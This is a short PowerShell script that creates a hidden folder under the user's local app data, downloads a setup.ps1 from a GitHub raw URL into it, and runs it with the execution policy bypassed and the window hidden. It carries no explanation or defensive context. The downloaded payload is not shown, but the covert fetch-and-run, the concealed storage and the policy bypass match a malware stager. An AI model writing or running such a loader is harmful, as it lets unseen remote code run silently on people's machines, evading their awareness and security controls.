$url = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/setup.ps1"
$hiddenFolderPath = "$env:LOCALAPPDATA\HiddenSqliteFolder"
$setupScriptPath = Join-Path $hiddenFolderPath "setup.ps1"
if (-not (Test-Path $hiddenFolderPath)) {
    New-Item -ItemType Directory -Path $hiddenFolderPath -Force | Out-Null
    Set-ItemProperty -Path $hiddenFolderPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
}
Invoke-WebRequest -Uri $url -OutFile $setupScriptPath
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$setupScriptPath`"" -WindowStyle Hidden
